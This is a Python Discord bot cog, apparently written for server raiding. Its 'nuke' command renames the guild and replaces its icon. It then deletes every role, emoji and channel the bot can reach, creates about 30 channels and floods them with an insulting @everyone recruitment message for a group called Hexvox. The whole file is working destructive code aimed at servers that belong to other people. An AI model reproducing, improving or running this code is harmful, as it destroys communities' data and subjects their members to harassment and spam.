import discord
from discord.ext import commands
import asyncio
import aiohttp

class NukeOriginal(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.URL_FOTO = "https://i.postimg.cc/0Q3dF5fX/Screenshot-20260419-094111.jpg"
        # Lista de IDs de servidores protegidos
        self.FORBIDDEN_IDS = [1501947925377319075, 1488596416694583396]
        self.INVITE_LINK = "https://discord.gg/NgMaE9GMQ"

    @commands.command(name="nuke")
    async def nuke(self, ctx):
        guild = ctx.guild
        
        # Protección: No hacer nada si es un servidor protegido
        if guild.id in self.FORBIDDEN_IDS:
            await ctx.send("⛔ Este comando no está permitido en este servidor protegido.")
            return

        print(f"☢️ PROTOCOLO NUKE INICIADO EN: {guild.name}")

        # 1. Cambiar nombre y foto del servidor
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.URL_FOTO) as resp:
                    if resp.status == 200:
                        imagen_bytes = await resp.read()
                        await guild.edit(name="☢️servidor destruido☢️", icon=imagen_bytes)
        except Exception as e:
            print(f"Error al editar servidor: {e}")

        # 2. Borrado de Roles y Emojis
        for role in guild.roles:
            if role.name != "@everyone" and role < guild.me.top_role:
                asyncio.create_task(self.safe_delete(role))

        for emoji in guild.emojis:
            asyncio.create_task(self.safe_delete(emoji))

        # 3. Borrado de Canales existentes
        for channel in guild.channels:
            asyncio.create_task(self.safe_delete(channel))

        # 4. Mensaje de ataque configurado
        mensaje_ataque = (
            "@everyone\n"
            "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n"
            "   ☠️ **HEXVOX HAS ARRIVED** ☠️\n"
            "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n"
            "> ⚔️ **HEXVOX LOS MANDA PUTA**\n"
            "> ⛓️ **OWNED BY HEXVOX LEGION**\n"
            "```idiotas 🤣 yo los mando únete ahora a la legión Hexvox```\n"
            f"🔗 **ÚNETE:** {self.INVITE_LINK}\n"
            f"{self.URL_FOTO}"
        )

        # 5. Creación de canales y spam de 50 mensajes (en grupos de 5)
        for _ in range(6): # 6 grupos de 5 = 30 canales
            tasks = [self.crear_y_spamear(guild, mensaje_ataque) for _ in range(5)]
            asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(2)

    async def safe_delete(self, obj):
        try:
            await obj.delete()
            await asyncio.sleep(0.1)
        except: pass

    async def crear_y_spamear(self, guild, mensaje):
        """Crea el canal con el nombre solicitado y envía 50 mensajes"""
        try:
            nuevo_canal = await guild.create_text_channel(name="destruido-por-hexvox")
            for _ in range(50): # 50 mensajes por canal
                await nuevo_canal.send(mensaje)
                await asyncio.sleep(0.7) # Pausa para evitar Rate Limit
        except:
            pass

async def setup(bot):
    await bot.add_cog(NukeOriginal(bot))
            
